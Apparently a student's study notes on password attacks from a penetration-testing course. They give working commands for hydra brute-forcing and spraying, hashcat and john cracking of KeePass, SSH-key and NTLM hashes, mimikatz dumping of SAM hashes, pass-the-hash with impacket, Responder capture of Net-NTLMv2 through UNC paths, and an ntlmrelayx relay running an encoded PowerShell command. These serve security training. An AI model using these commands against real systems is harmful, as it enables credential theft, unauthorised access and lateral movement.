# Password Attacks
# Attacking Network Service Logins
## Brute forcing ssh and RDP
We can use the tool hydra to brute force these services
let's say an ssh server was running on port 2222. We can use the following command to try and brute force the password for the user george
```
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
We can also try password spraying attacks where we try one password against multiple users
```
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## Http Post login forms
Many web applications have the default  user "admin". We can try dictionary attacks against admin

first we must gather the post data itself to obtain the request body.
Second we need a failed login attempt so we can tell hydra how to differentiate login attempts
Use Burp to intercept a login attempt so we can grab the request body

when using hyrda we can supply the option "http_post_form" which takes 3 arguemnts separeted by colons
`<web page the login form is on>:<request body>:<condition string>`
The request body should be copied from burp traffic with the username to brute force subbed out with ^USER^ and password to attack subbed out with ^PASS^
Condition string should be a string displayed by the web application when a failed login attempt occurs
Example:
```bash
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

## Password Cracking Fundamentals
John the ripper is a cpu based tool that supports gpu
Hashcat is a gpu tool that supports cpu
	-requires OpenCL or CUDA for GPU cracking process
These tools may support different algorithms
### Mutating Wordlists
we can use the sed function to mutate wordlists. For example we can find all passwords that start with 1 (likely a number sequence) and delete them using the following command
```
sed -i '/^1/d' demo.txt
```
-i flag for in place editing
^1 denotes the first character is 1
d denotes delete
The hashcat wiki: https://hashcat.net/wiki/doku.php?id=rule_based_attack details a list of possible rule functions with examples

For basics we can prepend characters with ^ and append with $
`echo \$1 > demo.rule`
`hashcat -r demo.rule --stdout demo.txt`

if rules are separated by space on the same line they will both be applied to the same password
If rules are on separate lines, they will be applied to a password separately --> if there are two rules there will be a 2 new passwords for each entry
 hashcat has some premade rules under /usr/share/hashcat/rules

Cracking Methodology
1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare wordlist
5. Attack the hash

We can use hash-identifier or hashid to identify the type of hash we are dealing with

### Password Managers
password managers create and store passwords for different services, protecting them with a master password.

During a penetration test, we may be able to dump the database, and crack the master password
In our example we see that KeePass is installed ona system
research shows that the database is in a .kbdx file on the system
We can use PowerShell "Get-ChildItem" to locate files in a specified location
```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
We locate the file in Documents and trnasfer it to our machine
Once on our machine we can use John to transform the file into a format useable by John --> John has various transformation scripts like ssh2john and keepass2john which can transform different file formats to be john compatible
```
keepass2john Database.kdbx > keepass.hash
```
This gets the database name with the master password into a file, not all passwords
We may still need to edit the file. The john script prepends "database" to the file, but Keepass does not use a username so we remove it
Now we jsut need to identify the hash and start cracking
In this example we use a premade hashcat rule for rockyou
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
### SSH Private Key passphrase
If we gain access to an SSH private key we still may need to supply a passphrase to log in
In our example we recover a private kay and a file with potential passwords, but none of the passwords work, citing a new policy
we can use the function ssh2john to get our private key in crackable form
We remove the prepended file name and search for the correct hashcat mode
`hashcat -h | grep -i "ssh"`
We create a function the make the first letter capital and prepend 137 to all passwords --> this was based on previous user habits
Mutate the passwords and run hashcat --> we get an error indicating "token length exception"
We need to use John
To use rules in John we need to make a .rule file and give the rule a name and specify syntax
for this example it looks like this
```
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
then we need to append it to john.conf
```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
Now we can use our rule with John to crack the password
```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## Working with Password Hashes
### Cracking NTLM
Windows stores hashed user passwords in the Security Account Manager database file (SAM) which is used to authenticate remote users
On modern systems, hashes are stored as NTLM hashes that are not salted
Salts are random bits appended to a password before it is hashed. They are used to prevent hash table lookups.
We cannot copy, rename, move the SAM file because the Kernel keeps an exclusive lock on it
Fortunately, we can use Mimikatz tool to do the heavy lifting for us
	Mimikatz includes the sekurlsa module to extract passwords and password hashes form the Local  Security Authority Subsystem (LSASS) process memory
LSASS is important because it catches the NTLM hahses and other credentials. However, this process runs as SYSTEM.
==Therefore, we need to have Administrator rights and *SeDebugPrivilege* access right enabled to extract hashes==

We can also elevate our privileges to the system account with tools like PsExec or the mimikatz function *token elevation function*. This function requires the *SeImpersonatePrivilege* access right to work, but all local Admins have it by default

We can use `Get-LocalUser` to see what users are on the system

If we see there are other users we can use mimikatz to recover the hash and try to crack it if it is NTLM

We need to run Powershell as administrator to properly run mimikatz
navigate to the folder it is stored in
```Powershell
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```
lsadump::sam will dump all ntlm hashes. copy the one for the targeted user into a file
We can quickly use the help flag of hashcat to figure out the correct mode
```
hashcat --help | grep -i "ntlm"
```
Now we are ready to use hashcat. We can use the best64.rule file to use the top 64 rules
```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
Once the password is cracked we can use it to log in via rdp (or other network protocols)
### Passing NTLM
If we recover an NTLM hash we can potentially relay it to other systems instead of having to crack it
If we don't use the local admin account in a pass-the-hash attack we need the remote system configured without UAC remote restrictions (which is enabled by default).

Let's assume we already have the password for a local user. The goal is to extract the admin password hash and authenticate to a different remote machine
We follow the same steps as before --> open PS as admin --> run mimikatz --> dump SAM and copy hash to file
To pass the hash we need tools that support authentication with NTLM hahses. smbclient and crackMapExec
For command execution we can use scripts from impacket library like psexec.py and wmiexec.py. 
We can also use the hash to connect ot other protocols like RDP and WinRM if available.
We could also conduct a pass-the-hash from mimkatz itself

for the first example we can connect to the SMB fileshrare using smbclient. Note: we need to use/escape the backslashes because it is a windows machine we are connecting to
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
This connects us to the share and we can download the secrets.txt file
To gain an interactive shell we can use the psexec.py script from impacket. This script searches for a writable share and uploads an executable file to it. Then it registers the executable as a Windows service and starts it
The -hashes argument is of the format LMHash:NTLMHash. SInce we only have NTLM hash we need to prepend it with 32 0's
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
This script will always log us in as the system account since it is running as a service
Another impacket script wmiexec is run the same way, but will log us in as the user
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
### Cracking Net-NTLMv2
In some pentests, we may obtain code execution or a shell on a windows machine as an underprivileged user. This means we cannot use mimikatz to extract passwords.
In these cases we can try to abuse the Net-NTLMv2 network authentication protocol.
In this example the goal is to get access to a windows share on a server 2022 machine from a windows 11 clientvia Net-NTLMv2.
At a hihg level, we send a request to the server, the server responds with a challenge in which we encrpyt our NTLMv2 hash to prove our identity.
Ideally we want to use NTLMv2 since it is less secure than Kerberos.
The *Responder* Tools is excellent for this. It includes a built inSMB server that handles the authentication process for us and prints the captured hashes

If we've obtained command execution on a rmeote server we can force it to authenticate to us by commanding it to connect to our SMB share.
Alternatively, if we don't have RCE we can try to force authenication other ways. For example, when we discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like **\\192.168.119.2\share\nonexistent.txt**. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

Let's assume we exploited some vector and have gained access to a remote system, but to a user that has no privilege
	On our machine we can run `ip a` to see all interfaces
	Then run repsonder and specify the interface we want `sudo repsonder -I tap0`
	Then on the remote machine machine we try to enumerate an SMB share `dir \\<attacking machine ip>\test`
	Responder should have captured the hash used to authenticate
We can then use Hashcat or john to crack the hash and authenticate on other services/machines

If websites have file uploads we can try to upload a file based on our attacking system while running responder. Ex filename="\\\\192.168.45.223\\test"

## Relaying NTLMv2
If we can't crack the NTLMv2 hash we can try to relay it. ==For this to work we need to either use the local administrator account or the target system needs UAC remote restrictions disabled==

We can use the tool *impacket ntlmrelayx* to conduct the relay attack
	flags:
	--no-http-server flag to disable that option
	--smb2support for smb2 support
	-t to set the target
	-c to  set the command. In this example we use an encoded powershell one liner
```PowerShell
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
We need to set up a listener for the machine we are relaying the connection to

hashcat command to crack ntlvm2
we can use hashgrabber.py in ~/tools to create a .lnk file that points back towards our machine. Catch ntlm hash with responder